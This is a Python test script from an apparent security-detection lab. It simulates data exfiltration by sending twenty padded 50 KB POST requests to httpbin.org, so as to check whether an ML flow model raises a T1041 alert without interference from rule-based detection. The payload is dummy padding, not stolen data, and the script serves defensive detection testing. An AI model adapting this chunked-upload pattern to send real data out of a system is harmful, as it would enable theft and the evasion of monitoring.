"""ML-only exfiltration test — validates flow_model detection in isolation.

This script runs from ml-test-sim, which has a NON-blacklisted IP (not
in known_bad_indicators.csv).  This eliminates RULE-001 as a confound:
if an alert fires, it must be from the ML pipeline, not the rule engine.

Detection target: flow_model anomaly (T1041, ML-based).
Mechanism: Sends large POST requests to httpbin.org/status/200, which
accepts POST with any body but returns an empty 200 response — producing
genuine send/receive asymmetry (high bytes_sent, near-zero bytes_received)
matching real exfiltration traffic patterns.

Expected result: flow_model anomaly score above 0.52 threshold, producing
an ML-only alert tagged T1041.  NOTE: the current model's training
baseline has near-zero exposure to multi-IP external destinations
(httpbin.org DNS round-robins across ~8 IPs), so the score may still
fall below threshold.  See PHASES.doc.md tracked limitation for details.
"""

from __future__ import annotations

import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import time

from scripts import banner, http_post, log

# Same payload parameters as attacker-sim exfiltration for controlled
# comparison — the only difference is the source container's IP.
CHUNK_SIZE = 50_000       # bytes per POST body
CHUNK_COUNT = 20          # total chunks (= ~1MB exfiltrated)
DELAY_BETWEEN = 0.5       # seconds between chunks
# httpbin.org/status/200: accepts POST, returns empty 200 (no echo).
# This produces genuine byte asymmetry: ~50KB out, ~230 bytes back.
TARGET_HOST = "httpbin.org"
TARGET_PORT = 80
TARGET_PATH = "/status/200"


def main() -> None:
    banner("ML EXFIL TEST — flow_model / T1041 (no rule-engine interference)")
    log(f"Target: {TARGET_HOST}:{TARGET_PORT}{TARGET_PATH} (POST)")
    log(f"Payload: {CHUNK_SIZE} bytes × {CHUNK_COUNT} chunks = "
        f"{CHUNK_SIZE * CHUNK_COUNT / 1024:.0f} KB total")
    log("Source: ml-test-sim (non-blacklisted IP — ML-only detection)")
    log("")

    success = 0
    failed = 0
    for i in range(1, CHUNK_COUNT + 1):
        payload = json.dumps({
            "user_id": 1,
            "product_id": 1,
            "quantity": 1,
            "_exfil_chunk": i,
            "_padding": "A" * (CHUNK_SIZE - 200),
        }).encode()

        code, body = http_post(
            TARGET_HOST, TARGET_PORT, TARGET_PATH,
            payload, content_type="application/json", timeout=5.0,
        )
        status = "OK" if code in (200, 201) else f"HTTP {code}"
        if code in (200, 201):
            success += 1
        else:
            failed += 1
        log(f"  chunk {i:>3d}/{CHUNK_COUNT}  {status}  "
            f"({len(payload)} bytes sent)")
        if i < CHUNK_COUNT:
            time.sleep(DELAY_BETWEEN)

    total_kb = CHUNK_SIZE * CHUNK_COUNT / 1024
    log("")
    log(f"Exfiltration complete: {success} sent, {failed} failed")
    log(f"Total data: {total_kb:.0f} KB in {CHUNK_COUNT} chunks")
    log("Expected detection: flow_model anomaly T1041 (ML-only, no RULE-001)")


if __name__ == "__main__":
    main()
